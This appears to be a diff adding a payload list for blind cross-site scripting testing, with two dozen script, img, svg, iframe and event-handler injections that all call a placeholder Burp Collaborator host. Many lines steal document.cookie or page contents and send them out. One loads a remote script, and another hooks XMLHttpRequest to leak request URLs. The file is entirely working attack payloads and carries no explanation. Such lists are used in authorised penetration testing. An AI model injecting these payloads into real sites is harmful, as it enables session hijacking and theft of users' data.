@@ -1,0 +1,24 @@
+<script src="https://YOUR-BURP-COLLABORATOR"></script>
+<script>fetch('https://YOUR-BURP-COLLABORATOR')</script>
+<script>document.location='https://YOUR-BURP-COLLABORATOR/?c='+document.cookie</script>
+<script>new Image().src='https://YOUR-BURP-COLLABORATOR/?c='+document.cookie</script>
+<script>navigator.sendBeacon('https://YOUR-BURP-COLLABORATOR',document.cookie)</script>
+<img src=x onerror="fetch('https://YOUR-BURP-COLLABORATOR')">
+<img src=x onerror="this.src='https://YOUR-BURP-COLLABORATOR/?c='+btoa(document.cookie)">
+<svg onload="fetch('https://YOUR-BURP-COLLABORATOR')">
+<svg onload="location='https://YOUR-BURP-COLLABORATOR/?c='+document.cookie">
+<body onload="fetch('https://YOUR-BURP-COLLABORATOR')">
+<iframe src="https://YOUR-BURP-COLLABORATOR"></iframe>
+<iframe srcdoc="<script>parent.location='https://YOUR-BURP-COLLABORATOR/?c='+parent.document.cookie</script>">
+<link rel="import" href="https://YOUR-BURP-COLLABORATOR">
+<input onfocus="fetch('https://YOUR-BURP-COLLABORATOR')" autofocus>
+<textarea autofocus onfocus="fetch('https://YOUR-BURP-COLLABORATOR')">
+<div onmouseover="fetch('https://YOUR-BURP-COLLABORATOR')">hover
+<form onsubmit="fetch('https://YOUR-BURP-COLLABORATOR')"><input type=submit>
+<script>$.getScript('https://YOUR-BURP-COLLABORATOR/xss.js')</script>
+<script>$.ajax({url:'https://YOUR-BURP-COLLABORATOR/',data:document.cookie})</script>
+<script>fetch('/').then(r=>r.text()).then(d=>fetch('https://YOUR-BURP-COLLABORATOR/',{method:'POST',body:d}))</script>
+<script>fetch('https://YOUR-BURP-COLLABORATOR/steal',{method:'POST',body:document.cookie})</script>
+<script>document.write('<img src="https://YOUR-BURP-COLLABORATOR/?c='+document.cookie+'">')</script>
+<script>window.open('https://YOUR-BURP-COLLABORATOR/?c='+document.cookie)</script>
+<script>XMLHttpRequest.prototype.open=function(m,u){if(u!='https://YOUR-BURP-COLLABORATOR'){fetch('https://YOUR-BURP-COLLABORATOR/?url='+u)}}</script>
